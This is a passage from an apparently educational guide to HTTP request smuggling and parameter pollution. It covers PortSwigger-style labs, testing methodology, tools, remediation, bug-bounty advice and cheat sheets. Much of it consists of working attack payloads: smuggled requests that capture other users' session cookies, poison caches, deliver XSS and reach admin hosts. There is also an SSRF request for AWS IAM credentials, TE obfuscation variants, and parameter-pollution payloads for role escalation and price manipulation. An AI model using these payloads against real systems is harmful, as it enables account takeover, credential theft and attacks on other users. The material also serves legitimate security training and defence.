**Concepts involved:**
- X-Forwarded-For spoofing
- Host header override
- Admin panel bypass via smuggling
- Local privilege (localhost trusted)

---

### Lab 9: Capturing Other Users' Requests

**The Most Dangerous Attack.** An attacker can steal session tokens, credentials, and other sensitive data from real users.

**Concept:**

```
1. Attacker smuggles a partial request as prefix
2. Next user's request is appended to attacker's smuggled prefix
3. Combined request is processed as a POST to attacker-controlled endpoint
4. User's full request (including cookies/tokens) is sent to attacker
```

**Step 1: Find a place to store/reflect text**
A comment, profile bio, or any field that reflects stored input.

**Step 2: Craft the capture payload**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Cookie: session=YOUR-SESSION-TOKEN
Content-Length: 910
Content-Type: application/x-www-form-urlencoded

csrf=YOUR-CSRF-TOKEN&postId=5&name=attacker&email=a@a.com&comment=
```

**How it works:**
```
The smuggled POST /post/comment has:
Content-Length: 910  ← Much larger than what attacker provides

The next user's request becomes the "comment" field!
Their entire request (with Cookie: session=...) gets appended
and saved as a comment on the post!

Attacker reads the comment → Steals victim's session!
```

**Content-Length calculation:**
```
Make CL large enough to capture the full next request
If too small: captures partial request (maybe enough for cookies)
If too large: back-end waits for more data → timeout
```

---

### Lab 10: Exploiting Reflected XSS via Request Smuggling

**Scenario:** A page reflects a User-Agent header without sanitization.

**Normal XSS:** User-Agent isn't typically attacker-controlled  
**Smuggled XSS:** Use request smuggling to set the User-Agent for another user's request

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
User-Agent: "><script>alert(document.cookie)</script>
Content-Length: 5

x=1
```

**Flow:**
```
1. Attacker smuggles GET /post?postId=5 with XSS in User-Agent
2. Next victim requests any page
3. Back-end prepends smuggled prefix → victim's request becomes body
4. Back-end sends GET /post?postId=5 with XSS User-Agent
5. Response reflects the XSS in User-Agent → executes in context of next user!
```

---

### Lab 11: Turning Self-XSS into Reflected XSS via Smuggling

**Scenario:** A reflected XSS exists in a search parameter, but it only affects the searcher themselves (self-XSS — normally not exploitable).

**With smuggling:** Deliver the XSS to other users.

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Length: 67
Transfer-Encoding: chunked

0

GET /?search="><script>alert(1)</script> HTTP/1.1
Foo: x
```

**Why it becomes exploitable:**
```
1. Attacker plants this smuggled request
2. Next user hits the server
3. Back-end prepends the smuggled GET /?search=XSS prefix
4. Response sent to next user contains the XSS
5. XSS executes in next user's browser
```

---

### Lab 12: Web Cache Poisoning via Request Smuggling

**Scenario:** Combine cache poisoning with smuggling to serve malicious content to all users.

**Concept:**
```
1. Smuggle a redirect/XSS response into the cache
2. Other users requesting the same URL get the poisoned cached response
```

**Attack:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: evil-user.net
Content-Length: 10

x=1
```

**If site uses Host header in redirects:**
```
Back-end generates redirect to evil-user.net
If this redirect gets cached → All users get redirected to attacker!
```

**Wormable cache poisoning:**
```
Cache hit for "/" returns attacker's redirect
Every user visiting "/" is redirected to attacker's site
Lasts until cache expires or is flushed
```

---

### Lab 13: Cache Deception via Request Smuggling

**Concept:** Cache a user-specific response (like `/my-account`) and serve it to attackers.

**Attack:**

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Length: 61
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Foo: x
```

**Flow:**
```
1. Attacker smuggles GET /my-account prefix
2. Next user (victim) hits the site
3. Back-end serves victim's /my-account to "foo.js" path
4. Cache caches this response under "foo.js" key
5. Attacker requests "foo.js" → Gets victim's account page with their token!
```

---

### Lab 14: HTTP/2 Request Smuggling via CL.0 Vulnerabilities

**Modern attack.** HTTP/2 inherently doesn't have the CL vs TE problem — but translation to HTTP/1.1 reintroduces it.

**CL.0 Attack:**

```
HTTP/2 to HTTP/1.1 downgrade:

H2 Request:
:method: POST
:path: /
:authority: target.com
content-length: 0      ← Legitimate H2 CL

Front-end (H2) sees: CL=0, no body
Front-end rewrites to H1: Content-Length: 0

But attacker injects a body in H2:
(H2 frames allow body regardless of CL header)

Front-end rewrites H1: Content-Length: 0
But H1 body IS present (from H2 DATA frame)
Back-end reads CL=0 → no body
Remaining body = smuggled prefix!
```

**This is "CL.0" — Content-Length is 0 but body exists.**

---

### Lab 15: Response Queue Poisoning

**Advanced attack.** Attacker receives another user's response entirely.

**Concept:**

```
Normal:  Req1→Resp1, Req2→Resp2, Req3→Resp3

Smuggled: Req1+SmuggleReq2→Resp1
          Resp2→Given to next user's Req2!
          Next user's Req2→Resp3
          Resp3→Given to user of Req3!

All responses are shifted by one → Complete response mixing!
```

**Impact:** Full response body of another user (session tokens, HTML with credentials) is delivered to attacker.

```http
POST / HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: YOUR-LAB.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

username=attacker&password=attacker&
```

Attacker sends this, then immediately sends a normal request. They receive the response meant for the next user.

---

### Lab 16: Bypassing Access Controls via Host Header Smuggling

**Concept:** Use smuggling to inject a different Host header, bypassing virtual hosting restrictions.

**Setup:**
- Target has two virtual hosts: `external.com` and `admin.internal`
- Admin only accessible via `admin.internal` host
- Front-end blocks direct requests to admin

**Attack:**

```http
POST / HTTP/1.1
Host: external.com
Content-Length: 57
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: admin.internal
X-Forwarded-For: 127.0.0.1
```

Back-end processes: `GET / HTTP/1.1` with `Host: admin.internal`  
Routes to admin virtual host → Access granted!

---

## 2.7 All Logical Attacks You Can Do with Request Smuggling

| Attack | Description | Impact |
|--------|-------------|--------|
| **Security Control Bypass** | Front-end WAF/auth bypass | High |
| **Admin Access** | Smuggle to admin endpoints | Critical |
| **User Request Capture** | Steal cookies/tokens from real users | Critical |
| **Response Queue Poisoning** | Receive wrong user's responses | Critical |
| **XSS Delivery** | Turn reflected/self XSS into stored | High |
| **Cache Poisoning** | Poison CDN cache with malicious response | High |
| **Cache Deception** | Cache sensitive user-specific pages | High |
| **SSRF Upgrade** | Use smuggling to reach internal services | High |
| **Redirect Hijacking** | Force redirect to attacker's domain | Medium |
| **Host Header Injection** | Access different virtual hosts | High |
| **Request Amplification** | Use one request to trigger many | Medium |
| **Authentication Bypass** | Login as different user via prefix | Critical |
| **Cross-User Data Leak** | Leak other users' data | High |
| **Rate Limit Bypass** | Smuggle multiple requests as one | Medium |
| **Log Injection** | Inject log entries | Low-Medium |

---

## 2.8 Step-by-Step Testing Methodology

### Phase 1: Initial Reconnaissance

```
Step 1: Identify if a front-end/back-end architecture exists
        - Check response headers for different server signatures
        - Look for Via:, X-Served-By:, X-Cache: headers
        - CDN indicators: CF-Ray (Cloudflare), X-Amz-Cf-Id (CloudFront)

Step 2: Identify supported HTTP versions
        - Does site support HTTP/2? (Browser DevTools → Network → Protocol)
        - Is HTTP/1.1 keep-alive enabled?

Step 3: Check for TE header reflection
        - Send Transfer-Encoding: chunked
        - See if it's reflected/stripped in response
```

### Phase 2: Automated Detection

```bash
# Using HTTP Request Smuggler (Burp extension)
1. Install "HTTP Request Smuggler" from BApp Store
2. Right-click any request
3. Extensions > HTTP Request Smuggler > Smuggle Probe
4. Check results in Alerts tab

# Using smuggler.py (standalone tool)
python3 smuggler.py -u https://target.com

# Using h2csmuggler for HTTP/2
python3 h2csmuggler.py --test https://target.com
```

### Phase 3: Manual Detection

```
Step 1: CL.TE timing probe
        → Send with CL=4, TE=chunked, body="1\r\nA\r\nX"
        → Wait 10 seconds → Delay = CL.TE confirmed

Step 2: TE.CL timing probe
        → Send with CL=6, TE=chunked, body="0\r\n\r\nX"
        → Wait 10 seconds → Delay = TE.CL confirmed

Step 3: Differential response (safer)
        → Send probe twice
        → Different response on 2nd send = vulnerable
```

### Phase 4: Exploitation

```
Step 1: Determine exploit type (CL.TE or TE.CL)
Step 2: Identify target endpoint:
        - /admin
        - /internal
        - /.env
Step 3: Craft exploit payload
Step 4: Test in low-traffic window (to avoid affecting users)
Step 5: Use Turbo Intruder for precise timing
Step 6: Confirm and document
```

### Phase 5: Documentation

```
Required evidence:
✓ HTTP request with smuggling payload
✓ Response showing impact (401→200, captured data, etc.)
✓ Timeline of events
✓ Affected users/data scope
✓ Reproducible PoC steps
```

---

## 2.9 When to Check for HRS

| Signal | Why |
|--------|-----|
| CDN/Load Balancer in place | Classic front-end/back-end split |
| Multiple server headers | Different servers at each layer |
| `Via:` or `X-Forwarded-For:` headers | Proxy in the chain |
| HTTP/2 with HTTP/1.1 backend | Downgrade attack surface |
| Inconsistent responses for same request | Request queue interference |
| WAF in place | Worth trying to bypass |
| Large enterprise application | Multi-tier architecture |
| API gateway + microservices | Multiple servers, multiple parsers |
| Response timing anomalies | Potential queue disruption |

---

## 2.10 HTTP/2 & H2C Smuggling Deep Dive

### HTTP/2 Differences

```
HTTP/1.1:                         HTTP/2:
─────────────────                 ──────────────────────────────
GET / HTTP/1.1                    Binary frames, not text
Host: example.com                 Multiplexed streams
Content-Length: 5                 :method :path :authority used
                                  No Content-Length ambiguity (in theory)
hello
```

### H2.CL Smuggling

When front-end accepts H2 but back-end is H1, the H2→H1 translation can introduce CL:

```
H2 request with body larger than CL header:

:method: POST
:path: /
content-length: 0

GET /admin HTTP/1.1
Host: target.com
```

Front-end sees `content-length: 0` in H2 → translates to H1 with `Content-Length: 0`  
But body (`GET /admin...`) is forwarded anyway!  
Back-end reads CL=0 → treats body as new request prefix

### H2.TE Smuggling

Inject Transfer-Encoding header via H2:

```
:method: POST
:path: /
transfer-encoding: chunked

0

GET /admin HTTP/1.1
Host: internal-host
```

H2 doesn't use TE (uses DATA frames), but if front-end passes the TE header to H1 backend...  
Back-end sees TE:chunked → processes as chunked → sees `0` terminator early → smuggle!

### H2C Upgrade Attack

```
Client sends HTTP/1.1 Upgrade request:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

If server upgrades to h2c (HTTP/2 cleartext):
Attacker can now send multiple requests multiplexed
without front-end seeing them individually
→ Front-end security controls bypassed!
```

---

## 2.11 Tools

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite Pro** | Full smuggling testing | HTTP Request Smuggler extension |
| **Turbo Intruder** | High-speed request sending | Precise timing attacks |
| **HTTP Request Smuggler** | Auto-detect + exploit | BApp Store extension |
| **smuggler.py** | Python standalone tool | `python3 smuggler.py -u URL` |
| **h2csmuggler** | HTTP/2 cleartext smuggling | `python3 h2csmuggler.py` |
| **Param Miner** | Discover hidden params | Burp BApp extension |
| **Reshaper** | Custom request transformation | Burp extension |
| **nuclei** | Template-based detection | `nuclei -t smuggling/ -u URL` |

**Burp Suite Configuration for Smuggling:**
```
1. Proxy → Options → Disable "Update Content-Length"
2. Repeater → Inspector → Disable "Follow redirects"
3. Use HTTP/1 in Repeater (not HTTP/2) for manual testing
4. Turn off "Normalize HTTP/1 requests"
```

---

## 2.12 Remediation

### For Front-End Servers

```nginx
# nginx: Reject requests with both CL and TE
if ($http_transfer_encoding ~ ".+") {
    return 400;
}

# Use HTTP/2 end-to-end
# Don't downgrade to HTTP/1.1 if avoidable
```

### For Back-End Servers

```apache
# Apache: Only accept one body-length header
# Reject if both CL and TE present
```

### General Fixes

```
✓ Use HTTP/2 end-to-end (no H1 back-end)
✓ Use CL.0 (Content-Length: 0) for GET requests
✓ Reject requests with both CL and TE headers
✓ Enable connection: close between proxies (no keep-alive)
✓ Use a WAF aware of smuggling (some Cloudflare rules)
✓ Normalize requests at the front-end before forwarding
✓ Enable strict HTTP parsing mode
✓ Update to modern servers (patched versions)
```

---

# PART 3: ADVANCED CHAINING & REAL-WORLD TECHNIQUES

---

## 3.1 Chaining HPP + HRS

```
Attack chain:
1. Identify HPP in a parameter (e.g., redirect_url)
2. Identify HRS in the same endpoint
3. Smuggle a request with polluted parameters
4. Result: WAF-bypassed + polluted request reaches backend

Example:
POST / HTTP/1.1
Content-Length: 120
Transfer-Encoding: chunked

0

POST /redirect HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

redirect_url=https://safe.com&redirect_url=https://attacker.com
```

## 3.2 HRS → SSRF

```
Smuggle requests to internal services:

Smuggled:
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254

→ AWS metadata endpoint → IAM credentials!
```

## 3.3 HRS → XSS → Account Takeover

```
Chain:
1. Find HRS (CL.TE)
2. Smuggle user's request to reflected XSS endpoint
3. XSS runs in victim's browser
4. XSS steals session cookie
5. Attacker uses cookie → full account takeover
```

## 3.4 HPP → OAuth Bypass

```
OAuth flow: /callback?code=LEGIT&state=SAFE

Polluted: /callback?code=ATTACKER&code=LEGIT&state=SAFE
         ^^^^^^^^^^^^^^^^^^^^^^^^^
         If server reads FIRST code: uses attacker's code
         → Account takeover if attacker controls that OAuth code
```

## 3.5 Cache Poisoning Chain

```
HRS → Cache Poison → Persistent XSS for ALL users

1. Smuggle request that makes server return XSS response for /
2. CDN caches the XSS response for /
3. All users visiting / get XSS
4. Wormable attack!
```

---

# PART 4: BUG BOUNTY STRATEGY

---

## 4.1 Where to Look

```
High-value targets for HPP:
✓ /payment, /checkout, /order
✓ /login, /signup, /verify
✓ /api/v1/user, /api/v1/role
✓ /oauth/callback, /auth/verify
✓ /search, /filter (WAF bypass)
✓ /send, /email, /notify

High-value targets for HRS:
✓ CDN-fronted applications
✓ API gateways
✓ Applications with load balancers
✓ Microservices architectures
✓ WAF-protected applications
```

## 4.2 Reporting HRS

HRS reports should include:

```markdown
## Summary
HTTP Request Smuggling (CL.TE) allowing bypass of front-end
security controls and access to restricted admin functionality.

## Steps to Reproduce
1. Send the following HTTP request to [endpoint]:
   [Full HTTP request]
2. Observe [specific impact]
3. Send second request to confirm [differential response]

## Proof of Concept
[Screenshots or video]

## Impact
- Bypass WAF/front-end security controls
- Access admin functionality as unauthenticated user
- Ability to steal other users' sessions

## CVSS Score
9.8 CRITICAL
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

## Remediation
[Specific fix recommendations]
```

## 4.3 Severity Classification

| Vulnerability | Typical Bounty Range |
|--------------|---------------------|
| HRS + Admin Bypass | $3,000 – $50,000+ |
| HRS + User Data Capture | $5,000 – $30,000 |
| HRS + Cache Poisoning | $2,000 – $15,000 |
| HRS + XSS Delivery | $1,500 – $10,000 |
| HPP + Authentication Bypass | $1,000 – $20,000 |
| HPP + Price Manipulation | $500 – $10,000 |
| HPP + WAF Bypass | $500 – $5,000 |
| HPP (Informational) | $0 – $500 |

---

# PART 5: QUICK REFERENCE CHEAT SHEETS

---

## 5.1 HPP Cheat Sheet

```
═══════════════════════════════════════════════════════════
                   HPP QUICK REFERENCE
═══════════════════════════════════════════════════════════

DUPLICATE PARAMETER BEHAVIOR:
  PHP / Ruby / Node   → LAST value wins
  ASP.NET / IIS       → ALL values (comma-joined)
  Java / Python / ASP → FIRST value wins

BASIC PAYLOADS:
  ?param=legitimate&param=malicious      (duplicate)
  ?param=malicious&param=legitimate      (reversed order)
  ?param[]=val1&param[]=val2             (array notation)
  ?param=val1%26param=val2              (encoded &)

WAF BYPASS:
  ?search=safe&search=<script>           (pollution bypass)
  ?q=<scr&q=ipt>alert(1)</script>        (split payload)

LOGIC ATTACKS:
  ?role=user&role=admin                  (privilege escalation)
  ?price=100&price=1                     (price manipulation)
  ?verified=false&verified=true          (state bypass)
  ?from=victim&to=attacker&from=attacker (transfer)
  ?code=LEGIT&code=ATTACKER             (OAuth bypass)

TESTING STEPS:
  1. Baseline request
  2. Add duplicate parameter
  3. Reverse parameter order
  4. Compare responses
  5. Document impact
═══════════════════════════════════════════════════════════
```

## 5.2 HRS Cheat Sheet

```
═══════════════════════════════════════════════════════════
              HTTP REQUEST SMUGGLING QUICK REFERENCE
═══════════════════════════════════════════════════════════

TYPES:
  CL.TE  → Front: Content-Length | Back: Transfer-Encoding
  TE.CL  → Front: Transfer-Encoding | Back: Content-Length
  TE.TE  → Both TE, one obfuscated to ignore TE

CL.TE TEMPLATE:
  POST / HTTP/1.1
  Content-Length: [LEN]
  Transfer-Encoding: chunked

  0

  [SMUGGLED REQUEST]

TE.CL TEMPLATE:
  POST / HTTP/1.1
  Content-Length: 4
  Transfer-Encoding: chunked

  [HEX_SIZE]
  [SMUGGLED REQUEST]
  0


TE OBFUSCATION:
  Transfer-Encoding: xchunked
  Transfer-Encoding: x-chunked
  Transfer-Encoding: chunked, dav
  Transfer-Encoding:chunked        (no space)
   Transfer-Encoding: chunked      (leading space)
  Transfer-Encoding: CHUNKED

TIMING PROBES:
  CL.TE: CL=4, TE=chunked, body ends with invalid chunk → timeout
  TE.CL: CL=6, TE=chunked, body="0\r\n\r\nX" → timeout

EXPLOITATION TARGETS:
  /admin, /internal, /.env
  Login endpoints (for user capture)
  Search (for XSS delivery)
  Cache endpoints (for poisoning)

TOOLS:
  Burp HTTP Request Smuggler extension
  Turbo Intruder (timing-precise)
  smuggler.py
  h2csmuggler.py (HTTP/2)
═══════════════════════════════════════════════════════════
```

## 5.3 Methodology Flowchart

```
START
  │
  ▼
Identify target architecture
  │
  ├─► Single server? → HPP testing only
  │
  └─► Front-end + Back-end? → Both HPP & HRS testing
            │
            ▼
      Test for HRS type:
            │
            ├─► Timing probe (CL.TE)
            │       │
            │       └─► Delayed? → CL.TE confirmed
            │
            ├─► Timing probe (TE.CL)
            │       │
            │       └─► Delayed? → TE.CL confirmed
            │
            └─► Try TE obfuscations → TE.TE?
                        │
                        ▼
               HTTP/2 downgrade? → H2.CL / H2.TE?
                        │
                        ▼
            Confirm with differential response
                        │
                        ▼
                 Exploit & Document
                        │
                        ▼
                    REPORT!
```

---

## 5.4 Recommended Resources

### Books
| Book | Author | Coverage |
|------|--------|----------|
| The Web Application Hacker's Handbook 2nd Ed. | Stuttard & Pinto | HPP fundamentals |
| Real-World Bug Hunting | Peter Yaworski | HPP case studies |
| Bug Bounty Bootcamp | Vickie Li | HPP methodology |
| The Tangled Web | Michal Zalewski | HTTP internals |

### Online Resources
- **PortSwigger Web Security Academy** — best free HRS labs
- **James Kettle's research** — "HTTP Desync Attacks" (2019 DEF CON)
- **OWASP Testing Guide** — HPP testing methodology
- **HackerOne Hacktivity** — Real HPP/HRS reports
- **PortSwigger Research Blog** — Latest smuggling research

### YouTube / Talks
- DEF CON 27: "HTTP Desync Attacks" — James Kettle
- OWASP AppSec 2009: "HTTP Parameter Pollution" — Di Paola & Carettoni
- NahamCon 2022: "Request Smuggling in the Wild"

---

> **⚠️ Legal Disclaimer:** This guide is for educational purposes and authorized security testing only. Always get written permission before testing. Unauthorized security testing is illegal in most jurisdictions. The author is not responsible for misuse of this information.

---

*Guide Version: 2.0 | Covers: HPP, HRS (CL.TE, TE.CL, TE.TE, H2), All PortSwigger Labs*  
*References: PortSwigger Research, OWASP, Real-World Bug Hunting (Peter Yaworski), Bug Bounty Bootcamp (Vickie Li)*
